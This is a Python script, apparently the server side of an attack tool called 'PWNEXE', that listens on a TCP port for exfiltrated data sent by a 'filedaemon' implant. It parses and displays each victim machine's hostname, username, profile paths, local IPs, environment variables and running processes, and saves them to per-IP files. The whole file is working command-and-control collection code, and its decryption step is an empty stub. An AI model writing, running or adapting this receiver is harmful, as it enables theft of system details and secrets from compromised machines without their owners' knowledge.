#!/usr/bin/env python3
"""
Simple data receiver for PWNEXE filedaemon module
Usage: python3 receiver.py [port]
"""

import socket
import json
import sys
import time
from datetime import datetime
import os

def decrypt_data(encrypted_data):
    """Simple decryption function - matches the Go implementation"""
    try:
        return encrypted_data
    except Exception as e:
        print(f"[-] Decryption failed: {e}")
        return None

def start_receiver(port=9000):
    """Start the data receiver server"""
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server_socket.bind(('0.0.0.0', port))
        server_socket.listen(5)
        print(f"[+] Data receiver started on port {port}")
        print(f"[+] Waiting for incoming data...")
        print(f"[+] Press Ctrl+C to stop")
        
        while True:
            client_socket, address = server_socket.accept()
            print(f"\n[+] New connection from {address[0]}:{address[1]}")
            
            try:
                length_data = client_socket.recv(8)
                if len(length_data) != 8:
                    print(f"[-] Invalid data length received")
                    continue
                
                data_length = 0
                for i in range(8):
                    data_length |= length_data[i] << (i * 8)
                
                print(f"[*] Expecting {data_length} bytes of data")
                
                received_data = b''
                while len(received_data) < data_length:
                    chunk = client_socket.recv(min(4096, data_length - len(received_data)))
                    if not chunk:
                        break
                    received_data += chunk
                
                if len(received_data) != data_length:
                    print(f"[-] Incomplete data received: {len(received_data)}/{data_length} bytes")
                    continue
                
                print(f"[+] Received {len(received_data)} bytes")
                
                decrypted_data = decrypt_data(received_data)
                if decrypted_data is None:
                    print(f"[-] Failed to decrypt data")
                    continue
                
                try:
                    system_data = json.loads(decrypted_data.decode('utf-8'))
                    display_system_data(system_data, address[0])
                    
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    filename = f"received_data_{address[0]}_{timestamp}.json"
                    with open(filename, 'w') as f:
                        json.dump(system_data, f, indent=2)
                    print(f"[+] Data saved to {filename}")
                    
                except json.JSONDecodeError:
                    print(f"[-] Failed to parse JSON data")
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    filename = f"raw_data_{address[0]}_{timestamp}.bin"
                    with open(filename, 'wb') as f:
                        f.write(decrypted_data)
                    print(f"[+] Raw data saved to {filename}")
                
            except Exception as e:
                print(f"[-] Error handling connection: {e}")
            finally:
                client_socket.close()
                
    except KeyboardInterrupt:
        print(f"\n[!] Shutting down receiver...")
    except Exception as e:
        print(f"[-] Server error: {e}")
    finally:
        server_socket.close()

def display_system_data(data, source_ip):
    """Display the received system data in a formatted way"""
    print(f"\n{'='*60}")
    print(f"SYSTEM DATA FROM {source_ip}")
    print(f"{'='*60}")
    
    if 'timestamp' in data:
        timestamp = datetime.fromtimestamp(data['timestamp']).strftime("%Y-%m-%d %H:%M:%S")
        print(f"Timestamp: {timestamp}")
    
    if 'hostname' in data:
        print(f"Hostname: {data['hostname']}")
    
    if 'username' in data:
        print(f"Username: {data['username']}")
    
    if 'computername' in data:
        print(f"Computer Name: {data['computername']}")
    
    if 'userprofile' in data:
        print(f"User Profile: {data['userprofile']}")
    
    if 'systemroot' in data:
        print(f"System Root: {data['systemroot']}")
    
    if 'programfiles' in data:
        print(f"Program Files: {data['programfiles']}")
    
    if 'current_dir' in data:
        print(f"Current Directory: {data['current_dir']}")
    
    if 'local_ips' in data:
        print(f"Local IPs: {', '.join(data['local_ips'])}")
    
    if 'environment' in data:
        env_count = len(data['environment'])
        print(f"Environment Variables: {env_count} items")
        for i, (key, value) in enumerate(list(data['environment'].items())[:5]):
            print(f"  {key}: {value}")
        if env_count > 5:
            print(f"  ... and {env_count - 5} more")
    
    if 'processes' in data:
        print(f"Processes: {', '.join(data['processes'])}")
    
    print(f"{'='*60}\n")

if __name__ == "__main__":
    port = 9000
    if len(sys.argv) > 1:
        try:
            port = int(sys.argv[1])
        except ValueError:
            print(f"[-] Invalid port number: {sys.argv[1]}")
            sys.exit(1)
    
    start_receiver(port) 